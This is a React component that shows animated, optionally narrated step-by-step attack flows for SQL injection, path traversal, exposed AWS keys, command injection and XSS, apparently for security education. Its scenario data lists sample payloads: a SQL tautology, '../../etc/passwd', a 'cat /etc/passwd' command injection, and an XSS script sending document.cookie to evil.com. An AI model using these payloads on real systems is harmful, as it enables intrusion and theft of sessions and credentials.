'use client';

import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import {
    User, Database, Globe, Zap, ArrowRight, XCircle, Info,
    Search, FileCode, ShieldAlert, Key, Lock, Server, Terminal
} from 'lucide-react';
import { createPortal } from 'react-dom';



interface AttackFlowVisualizerProps {
    onClose: () => void;
    vulnerabilityType: string;
}

// Stage configuration type
interface Stage {
    id: number;
    title: string;
    icon: any;
    description: string;
    example: string;
    color: string;
    bgColor: string;
    borderColor: string;
}

// Scenarios configuration
const SCENARIOS: Record<string, Stage[]> = {
    'sql_injection': [
        {
            id: 1,
            title: "Reconnaissance",
            icon: Search,
            description: "Attacker identifies input vector (User ID parameter) vulnerable to injection",
            example: "user_id=1'",
            color: 'text-blue-400',
            bgColor: 'bg-blue-500/10',
            borderColor: 'border-blue-500/30'
        },
        {
            id: 2,
            title: "Server Processing",
            icon: Database,
            description: "Application builds SQL query using unsanitized user input",
            example: "SELECT * FROM users WHERE id = '1''",
            color: 'text-yellow-400',
            bgColor: 'bg-yellow-500/10',
            borderColor: 'border-yellow-500/30'
        },
        {
            id: 3,
            title: "Query Execution",
            icon: Zap,
            description: "Malicious SQL command is executed by the database engine",
            example: "OR '1'='1' --",
            color: 'text-orange-400',
            bgColor: 'bg-orange-500/10',
            borderColor: 'border-orange-500/30'
        },
        {
            id: 4,
            title: "Data Exfiltration",
            icon: ShieldAlert,
            description: "Database returns unauthorized data to the attacker",
            example: "Dumped: users, admin_creds",
            color: 'text-red-400',
            bgColor: 'bg-red-500/10',
            borderColor: 'border-red-500/30'
        }
    ],
    'path_traversal': [
        {
            id: 1,
            title: "Reconnaissance",
            icon: Search,
            description: "Attacker identifies file retrieval endpoint vulnerable to traversal",
            example: "GET /files?path=report.pdf",
            color: 'text-blue-400',
            bgColor: 'bg-blue-500/10',
            borderColor: 'border-blue-500/30'
        },
        {
            id: 2,
            title: "Malicious Request",
            icon: FileCode,
            description: "Attacker crafts request with traversal sequences to escape directory",
            example: "path=../../../../etc/passwd",
            color: 'text-yellow-400',
            bgColor: 'bg-yellow-500/10',
            borderColor: 'border-yellow-500/30'
        },
        {
            id: 3,
            title: "Path Resolution",
            icon: Server,
            description: "Server resolves the relative path to a sensitive system file",
            example: "/var/www/../../etc/passwd",
            color: 'text-orange-400',
            bgColor: 'bg-orange-500/10',
            borderColor: 'border-orange-500/30'
        },
        {
            id: 4,
            title: "System Compromise",
            icon: Lock,
            description: "Sensitive system file contents are returned to the attacker",
            example: "root:x:0:0:root:/root:/bin/bash",
            color: 'text-red-400',
            bgColor: 'bg-red-500/10',
            borderColor: 'border-red-500/30'
        }
    ],
    'security_misconfiguration': [
        {
            id: 1,
            title: "Discovery",
            icon: Search,
            description: "Attacker scans codebase or repository for exposed secrets",
            example: "grep -r 'AWS_ACCESS_KEY'",
            color: 'text-blue-400',
            bgColor: 'bg-blue-500/10',
            borderColor: 'border-blue-500/30'
        },
        {
            id: 2,
            title: "Extraction",
            icon: Key,
            description: "Hardcoded credentials (AWS Keys) are extracted from source",
            example: "AKIA_EXAMPLE_KEY",
            color: 'text-yellow-400',
            bgColor: 'bg-yellow-500/10',
            borderColor: 'border-yellow-500/30'
        },
        {
            id: 3,
            title: "Authentication",
            icon: Server,
            description: "Attacker uses stolen keys to authenticate with cloud provider",
            example: "aws sts get-caller-identity",
            color: 'text-orange-400',
            bgColor: 'bg-orange-500/10',
            borderColor: 'border-orange-500/30'
        },
        {
            id: 4,
            title: "Resource Abuse",
            icon: ShieldAlert,
            description: "Unauthorized access to cloud resources, data, or computing",
            example: "aws s3 ls --recursive",
            color: 'text-red-400',
            bgColor: 'bg-red-500/10',
            borderColor: 'border-red-500/30'
        }
    ],
    'command_injection': [
        {
            id: 1,
            title: "Input Vector",
            icon: Search,
            description: "Attacker identifies a system shell command vulnerability",
            example: "ping_host.php?ip=127.0.0.1",
            color: 'text-blue-400',
            bgColor: 'bg-blue-500/10',
            borderColor: 'border-blue-500/30'
        },
        {
            id: 2,
            title: "Payload Injection",
            icon: Terminal,
            description: "Attacker appends a command separator and malicious command",
            example: "127.0.0.1; cat /etc/passwd",
            color: 'text-yellow-400',
            bgColor: 'bg-yellow-500/10',
            borderColor: 'border-yellow-500/30'
        },
        {
            id: 3,
            title: "Shell Execution",
            icon: Zap,
            description: "Server executes the injected command with system privileges",
            example: "sh -c 'ping 127.0.0.1; cat ...'",
            color: 'text-orange-400',
            bgColor: 'bg-orange-500/10',
            borderColor: 'border-orange-500/30'
        },
        {
            id: 4,
            title: "System Compromise",
            icon: ShieldAlert,
            description: "Attacker gains remote code execution (RCE) or retrieves sensitive data",
            example: "root:x:0:0:root:/root:/bin/bash",
            color: 'text-red-400',
            bgColor: 'bg-red-500/10',
            borderColor: 'border-red-500/30'
        }
    ],
    'xss': [
        {
            id: 1,
            title: "Script Injection",
            icon: FileCode,
            description: "Attacker injects malicious JavaScript into the application",
            example: "<script>fetch('http://evil.com/'+document.cookie)</script>",
            color: 'text-blue-400',
            bgColor: 'bg-blue-500/10',
            borderColor: 'border-blue-500/30'
        },
        {
            id: 2,
            title: "Persistence / Reflection",
            icon: Database,
            description: "The script is stored in the DB or reflected in the response",
            example: "Saved to 'user_bio' field",
            color: 'text-yellow-400',
            bgColor: 'bg-yellow-500/10',
            borderColor: 'border-yellow-500/30'
        },
        {
            id: 3,
            title: "Victim Execution",
            icon: Globe,
            description: "Victim loads the compromised page",
            example: "Browser renders <script> tag",
            color: 'text-orange-400',
            bgColor: 'bg-orange-500/10',
            borderColor: 'border-orange-500/30'
        },
        {
            id: 4,
            title: "Session Hijacking",
            icon: User,
            description: "Attacker accesses victim's session tokens or data",
            example: "Cookie sent to attacker server",
            color: 'text-red-400',
            bgColor: 'bg-red-500/10',
            borderColor: 'border-red-500/30'
        }
    ],
    'default': [ // Generic fallback
        {
            id: 1,
            title: "User Input",
            icon: User,
            description: "Attacker submits malicious script through form field",
            example: "<script>steal()</script>",
            color: 'text-blue-400',
            bgColor: 'bg-blue-500/10',
            borderColor: 'border-blue-500/30'
        },
        {
            id: 2,
            title: "Server Processing",
            icon: Database,
            description: "Server accepts input without validation/sanitization",
            example: "No input filtering applied",
            color: 'text-yellow-400',
            bgColor: 'bg-yellow-500/10',
            borderColor: 'border-yellow-500/30'
        },
        {
            id: 3,
            title: "Page Rendered",
            icon: Globe,
            description: "Browser receives page with malicious script embedded",
            example: "HTML includes raw script",
            color: 'text-orange-400',
            bgColor: 'bg-orange-500/10',
            borderColor: 'border-orange-500/30'
        },
        {
            id: 4,
            title: "Script Execution",
            icon: Zap,
            description: "Browser executes the injected JavaScript code",
            example: "Cookies stolen, session hijacked",
            color: 'text-red-400',
            bgColor: 'bg-red-500/10',
            borderColor: 'border-red-500/30'
        }
    ]
};

export function AttackFlowVisualizer({ onClose, vulnerabilityType }: AttackFlowVisualizerProps) {
    const [mounted, setMounted] = useState(false);
    const [activeStage, setActiveStage] = useState(0);

    // Determine scenarios based on vulnerability type
    const normalizedType = vulnerabilityType.toLowerCase().replace(/ /g, '_');
    const stages = SCENARIOS[normalizedType] ||
        (normalizedType.includes('sql') ? SCENARIOS['sql_injection'] :
            normalizedType.includes('path') || normalizedType.includes('traversal') ? SCENARIOS['path_traversal'] :
                normalizedType.includes('config') || normalizedType.includes('hardcoded') ? SCENARIOS['security_misconfiguration'] :
                    normalizedType.includes('command') || normalizedType.includes('rce') || normalizedType.includes('shell') ? SCENARIOS['command_injection'] :
                        normalizedType.includes('xss') || normalizedType.includes('script') ? SCENARIOS['xss'] :
                            SCENARIOS['default']);

    const [isTTSEnabled, setIsTTSEnabled] = useState(false);

    useEffect(() => {
        setMounted(true);
        // Auto-play animation loop
        const interval = setInterval(() => {
            setActiveStage(prev => {
                const next = (prev + 1) % (stages.length + 1);
                return next;
            });
        }, 1500); // 1.5s per step? The user might want it slower if TTS is on.

        return () => {
            setMounted(false);
            clearInterval(interval);
            window.speechSynthesis.cancel();
        };
    }, [stages.length]);

    // Enhanced Interval handling to respect TTS
    useEffect(() => {
        if (!mounted) return;

        // If TTS is on, we might want to slow down or sync with speech, but for now let's just speak
        if (isTTSEnabled && activeStage > 0 && activeStage <= stages.length) {
            const stage = stages[activeStage - 1];
            const text = `${stage.title}. ${stage.description}`;
            const utterance = new SpeechSynthesisUtterance(text);
            utterance.rate = 1.2; // Slightly faster
            window.speechSynthesis.cancel(); // Stop previous
            window.speechSynthesis.speak(utterance);
        }
    }, [activeStage, isTTSEnabled, mounted, stages]);

    if (!mounted) return null;

    return createPortal(
        <div className="fixed inset-0 z-[9999] overflow-y-auto bg-black/90 backdrop-blur-xl">
            <div className="flex min-h-screen items-center justify-center p-4">
                <motion.div
                    initial={{ scale: 0.95, opacity: 0 }}
                    animate={{ scale: 1, opacity: 1 }}
                    className="w-full max-w-6xl relative bg-slate-900 rounded-2xl border-2 border-blue-500/30 shadow-2xl shadow-blue-500/20 overflow-hidden my-6"
                >
                    {/* Header */}
                    <div className="p-6 bg-gradient-to-r from-slate-800 to-slate-900 border-b border-blue-500/30">
                        <div className="flex justify-between items-start">
                            <div className="flex items-start gap-4 flex-1">
                                <div className="w-12 h-12 rounded-xl bg-blue-500/20 flex items-center justify-center border border-blue-500/40 flex-shrink-0">
                                    <Info className="w-6 h-6 text-blue-400" />
                                </div>
                                <div className="flex-1">
                                    <h3 className="text-2xl font-bold text-white mb-1">Attack Flow Visualization</h3>
                                    <p className="text-sm text-gray-400 mb-0">Step-by-step breakdown of the exploit execution path.</p>
                                </div>
                            </div>
                            <button
                                onClick={onClose}
                                className="p-2 hover:bg-red-500/20 rounded-xl transition-colors text-gray-400 hover:text-red-400"
                            >
                                <XCircle className="w-6 h-6" />
                            </button>
                        </div>
                    </div>

                    {/* Controls */}
                    <div className="absolute top-6 right-16 flex gap-2">
                        <button
                            onClick={() => {
                                setIsTTSEnabled(!isTTSEnabled);
                                if (isTTSEnabled) window.speechSynthesis.cancel();
                            }}
                            className={`p-2 rounded-xl transition-all border ${isTTSEnabled
                                ? 'bg-blue-500 text-white border-blue-400 shadow-[0_0_15px_rgba(59,130,246,0.5)]'
                                : 'bg-slate-800 text-gray-400 border-slate-700 hover:text-white'}`}
                            title={isTTSEnabled ? "Mute Narration" : "Enable Narration"}
                        >
                            {/* Simple Volume Icon */}
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-6 h-6">
                                {isTTSEnabled ? (
                                    <>
                                        <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon>
                                        <path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"></path>
                                    </>
                                ) : (
                                    <>
                                        <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon>
                                        <line x1="23" y1="9" x2="17" y2="15"></line>
                                        <line x1="17" y1="9" x2="23" y2="15"></line>
                                    </>
                                )}
                            </svg>
                        </button>
                    </div>

                    {/* Visualization Content */}
                    <div className="p-8 bg-slate-800/50">
                        <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
                            {stages.map((stage, idx) => {
                                const Icon = stage.icon;
                                const isActive = activeStage >= stage.id;
                                const isCurrent = activeStage === stage.id;

                                return (
                                    <React.Fragment key={stage.id}>
                                        <motion.div
                                            className={`p-5 rounded-xl border-2 transition-all duration-500 relative ${isActive ? `${stage.bgColor} ${stage.borderColor}` : 'bg-slate-800/30 border-slate-700'
                                                } ${isCurrent ? 'ring-2 ring-offset-2 ring-offset-slate-900 ring-' + (isActive ? stage.color.replace('text-', '') + '-400' : 'gray-700') : ''}`}
                                        >
                                            {isCurrent && (
                                                <motion.div
                                                    layoutId="active-ring"
                                                    className="absolute inset-0 border-2 border-white/20 rounded-xl"
                                                    transition={{ type: "spring", stiffness: 300, damping: 30 }}
                                                />
                                            )}

                                            <div className="flex items-center gap-3 mb-4">
                                                <div className={`w-12 h-12 rounded-lg ${isActive ? stage.bgColor : 'bg-slate-700'} flex items-center justify-center transition-colors duration-500`}>
                                                    <Icon className={`w-6 h-6 ${isActive ? stage.color : 'text-gray-500'}`} />
                                                </div>
                                                <div className="flex-1">
                                                    <div className={`text-sm font-bold ${isActive ? 'text-white' : 'text-gray-500'}`}>
                                                        Step {stage.id}
                                                    </div>
                                                    <div className={`text-xs font-medium ${isActive ? stage.color : 'text-gray-600'}`}>
                                                        {stage.title}
                                                    </div>
                                                </div>
                                            </div>

                                            <p className={`text-sm leading-relaxed mb-3 ${isActive ? 'text-gray-300' : 'text-gray-600'}`}>
                                                {stage.description}
                                            </p>

                                            <code className={`block text-[11px] px-3 py-2 rounded font-mono ${isActive ? 'bg-black/40 text-emerald-400 border border-emerald-500/20' : 'bg-slate-800/50 text-gray-700 border border-slate-700'}`}>
                                                {stage.example}
                                            </code>
                                        </motion.div>

                                        {idx < stages.length - 1 && (
                                            <div className="hidden md:flex items-center justify-center">
                                                <ArrowRight className={`w-8 h-8 transition-colors duration-500 ${activeStage > stage.id ? 'text-emerald-500' : 'text-slate-700'}`} />
                                            </div>
                                        )}
                                    </React.Fragment>
                                );
                            })}
                        </div>
                    </div>
                </motion.div>
            </div>
        </div>,
        document.body
    );
}
